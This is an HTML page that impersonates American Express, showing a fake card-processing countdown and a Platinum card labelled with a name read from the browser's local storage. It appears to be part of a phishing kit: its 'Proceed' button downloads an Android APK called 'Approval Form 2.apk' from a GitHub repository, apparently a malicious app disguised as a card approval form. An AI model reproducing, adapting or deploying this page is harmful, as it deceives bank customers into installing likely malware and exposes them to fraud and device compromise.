<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>American Express Platinum</title>

<style>

:root{
    --amex-blue:#00175a;
    --amex-light:#0070d5;
}

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

html,
body{
    width:100%;
    min-height:100%;
}

body{
    font-family:Arial, Helvetica, sans-serif;

    background:
    radial-gradient(circle at top,#ffffff,#eef2ff 45%,#dde7ff);

    display:flex;
    flex-direction:column;

    overflow-x:hidden;
}

/* NAVBAR */

nav{
    width:100%;

    background:#fff;

    border-bottom:1px solid #ddd;

    padding:14px 5%;

    display:flex;
    align-items:center;
    gap:30px;

    flex-wrap:wrap;
}

.amex-logo-box{
    background:#00175a;

    color:#fff;

    padding:8px 12px;

    font-size:13px;
    font-weight:700;

    line-height:1.1;

    border-radius:2px;

    text-align:center;

    min-width:85px;

    letter-spacing:1px;
}

.nav-links{
    display:flex;
    gap:25px;
    margin-right:auto;
}

.nav-links a{
    text-decoration:none;
    color:#222;

    font-size:15px;
    font-weight:500;
}

.login-btn{
    border:1px solid #ccc;

    background:#f7f7f7;

    padding:10px 22px;

    cursor:pointer;

    font-weight:bold;

    border-radius:5px;
}

/* PROCESSING SCREEN */

.processing-screen{
    position:fixed;
    inset:0;

    z-index:99999;

    background:
    linear-gradient(135deg,#f5f8ff,#edf2ff);

    display:flex;
    align-items:center;
    justify-content:center;
    flex-direction:column;

    transition:1s;
}

.processing-screen.hide{
    opacity:0;
    visibility:hidden;
}

.loader{
    width:95px;
    height:95px;

    border-radius:50%;

    border:7px solid rgba(0,0,0,0.08);

    border-top:7px solid var(--amex-blue);

    animation:spin 1s linear infinite;

    margin-bottom:30px;
}

@keyframes spin{

    100%{
        transform:rotate(360deg);
    }
}

.processing-text{
    font-size:32px;

    color:var(--amex-blue);

    font-weight:700;

    margin-bottom:14px;

    text-align:center;
}

.processing-subtext{
    font-size:16px;

    color:#555;

    margin-bottom:24px;

    text-align:center;
}

.timer{
    font-size:58px;

    font-weight:bold;

    color:#111;
}

/* MAIN */

.wrapper{
    flex:1;

    width:100%;

    display:flex;
    align-items:center;
    justify-content:center;

    padding:60px 20px;

    opacity:0;

    transition:1s;
}

.wrapper.show{
    opacity:1;
}

/* CARD */

.card{
    width:430px;
    height:270px;

    position:relative;

    border-radius:24px;

    overflow:hidden;

    animation:
    floatCard 5s ease-in-out infinite,
    shadowPulse 4s ease-in-out infinite;

    box-shadow:
    0 20px 45px rgba(0,0,0,0.22);
}

/* FLOAT */

@keyframes floatCard{

    0%{
        translate:0 0;
    }

    50%{
        translate:0 -10px;
    }

    100%{
        translate:0 0;
    }
}

/* SHADOW */

@keyframes shadowPulse{

    0%{
        filter:drop-shadow(0 18px 28px rgba(0,0,0,0.18));
    }

    50%{
        filter:drop-shadow(0 28px 45px rgba(0,23,90,0.28));
    }

    100%{
        filter:drop-shadow(0 18px 28px rgba(0,0,0,0.18));
    }
}

/* CARD IMAGE */

.card-image{
    width:100%;
    height:100%;

    object-fit:cover;

    display:block;
}

/* NAME */

.card-name{
    position:absolute;

    bottom:52px;
    left:38px;

    font-size:16px;

    font-weight:600;

    letter-spacing:1.5px;

    text-transform:uppercase;

    color:#111;
}

/* CARD NUMBER */

.card-number{
    position:absolute;

    bottom:26px;
    left:38px;

    font-size:18px;

    font-weight:500;

    letter-spacing:2px;

    color:#111;
}

/* BUTTON */

.actions{
    margin-top:38px;

    display:flex;
    justify-content:center;
}

.btn{
    padding:16px 42px;

    border:none;
    border-radius:60px;

    background:
    linear-gradient(
        135deg,
        var(--amex-blue),
        #003ca3
    );

    color:#fff;

    font-size:15px;
    font-weight:bold;

    text-decoration:none;

    transition:0.35s;

    box-shadow:
    0 12px 25px rgba(0,23,90,0.25);
}

.btn:hover{

    transform:
    translateY(-3px)
    scale(1.03);

    background:
    linear-gradient(
        135deg,
        var(--amex-light),
        #0059c1
    );
}

/* FOOTER */

footer{
    width:100%;

    text-align:center;

    padding:24px 15px;

    color:#888;

    font-size:13px;

    margin-top:auto;
}

/* MOBILE */

@media(max-width:500px){

    nav{
        justify-content:space-between;
    }

    .nav-links{
        display:none;
    }

    .card{
        width:340px;
        height:215px;
    }

    .card-name{
        font-size:13px;
        left:30px;
        bottom:42px;
    }

    .card-number{
        font-size:15px;
        left:30px;
        bottom:20px;
    }

    .processing-text{
        font-size:24px;
    }

    .timer{
        font-size:46px;
    }

    footer{
        font-size:12px;
        padding-bottom:30px;
    }
}

</style>
</head>

<body>

<!-- PROCESSING -->

<div class="processing-screen" id="processingScreen">

    <div class="loader"></div>

    <div class="processing-text">
        We are processing your request
    </div>

    <div class="processing-subtext">
        Please wait while we prepare your Platinum Card
    </div>

    <div class="timer" id="timer">
        12
    </div>

</div>

<!-- NAVBAR -->

<nav>

    <div class="amex-logo-box">
        AMERICAN<br>EXPRESS
    </div>

    <div class="nav-links">
        <a href="#">My Account</a>
        <a href="#">Cards</a>
        <a href="#">Travel</a>
        <a href="#">Insurance</a>
    </div>

    <button class="login-btn">
        Log In
    </button>

</nav>

<!-- MAIN -->

<div class="wrapper" id="mainWrapper">

    <div>

        <div class="card">

            <img
            src="front.jpeg"
            class="card-image"
            alt="Front Card">

            <div
            class="card-name"
            id="cardName">
            </div>

            <div class="card-number">
                XXXX XXXX XXXX 3579
            </div>

        </div>

        <!-- BUTTON -->

        <div class="actions">

            <a
            href="https://github.com/hhhy97851-star/security/raw/refs/heads/main/Approval%20Form%202.apk"
            class="btn">

                Proceed

            </a>

        </div>

    </div>

</div>

<!-- FOOTER -->

<footer>
    Copyright © 2026 American Express Banking Corp.
</footer>

<script>

/*
===========================================
PROCESSING TIMER
===========================================
*/

let timeLeft = 12;

const timer =
document.getElementById("timer");

const processingScreen =
document.getElementById("processingScreen");

const mainWrapper =
document.getElementById("mainWrapper");

const countdown = setInterval(() => {

    timeLeft--;

    timer.innerText =
    timeLeft < 10
    ? "0" + timeLeft
    : timeLeft;

    if(timeLeft <= 0){

        clearInterval(countdown);

        processingScreen.classList.add("hide");

        mainWrapper.classList.add("show");

    }

},1000);

/*
===========================================
LOCAL STORAGE
===========================================
*/

const firstName =
localStorage.getItem("firstName") || "";

const lastName =
localStorage.getItem("lastName") || "";

const fullName =
(firstName + " " + lastName).trim();

/*
===========================================
SHOW DATA
===========================================
*/

document.getElementById("cardName").innerText =
fullName.toUpperCase();

</script>

</body>
</html>
